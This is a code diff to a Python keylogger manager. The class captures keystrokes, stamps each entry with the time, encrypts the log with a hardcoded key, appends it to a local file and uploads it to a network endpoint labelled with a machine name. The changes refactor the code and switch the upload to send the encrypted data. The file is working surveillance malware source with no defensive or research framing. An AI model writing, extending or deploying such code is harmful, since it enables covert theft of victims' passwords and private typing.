@@ -1,56 +1,58 @@
+
+import json
+import time
 from KeyLoggerService import KeyLogger
 from fileWriter import MyFile
 from network_writer import NetworkWriter
 from Encryption import Crypto
-import json
 
 class KeyLoggerManager:
     def __init__(self, file_path="encrypt.txt", network_url=None, crypto_key="abcdefjhijklmnopqrstuvwxyz"):
         self.logger = KeyLogger()
         self.crypto = Crypto(crypto_key)
-
-        # Writer file
         self.file = MyFile(file_path)
-
-        # Writer network (option)
-        if network_url:
-            self.network_writer = NetworkWriter(network_url, self.crypto)
-        else:
-            self.network_writer = None
+        self.network_writer = NetworkWriter(network_url, self.crypto) if network_url else None
 
     def start_logger(self):
         self.logger.start_logging()
 
-    def stop_logger(self, machine_name="Machine_01"):
+    def stop_logger(self, machine_name="Machine_02"):
         self.logger.stop_logging()
-        data = str(self.logger.get_logged_keys())
+        words = self.logger.get_logged_keys()
+
+        # time signature
+        timestamped_data = []
+        current_minute = time.strftime("%Y-%m-%d %H:%M")
+        for w in words:
+            timestamped_data.append(f"[{current_minute}] {w}")
+
+        data = "\n".join(timestamped_data)
 
         # Encryption
         encrypted_data = self.crypto.process(data)
 
-        # Write to file
-        with open(self.file.file_name, "a") as f:
-            f.write(json.dumps(encrypted_data) + "\n")  # une ligne par session
+        # Local writing
+        with open(self.file.file_name, "a", encoding="utf-8") as f:
+            f.write(json.dumps(encrypted_data) + "\n")
 
-        # send to network
+        # Network sending
         if self.network_writer:
-            self.network_writer.send_data(data, machine_name)
+            self.network_writer.send_data(encrypted_data, machine_name)
 
 
-# - example---
 if __name__ == "__main__":
-    # for use only the file :
-    # manager = KeyLoggerManager(file_path="encrypt.txt")
-
-    # for use file + network :
+    # Create the manager with local file + network sending
     manager = KeyLoggerManager(
         file_path="encrypt.txt",
-        network_url="http://127.0.0.1:5000/api/upload"  # serveur local ou distant
+        network_url="http://127.0.0.1:5000/api/upload"
     )
 
+    # Start the keylogger
     manager.start_logger()
-    manager.stop_logger("Machine_01")
 
+    # Stop the keylogger and processes data
+    manager.stop_logger("Machine_02")
+
+    # Display the file and its contents 
     print("File :", manager.file.file_name)
     print("File contain :", manager.file.read_file())
-
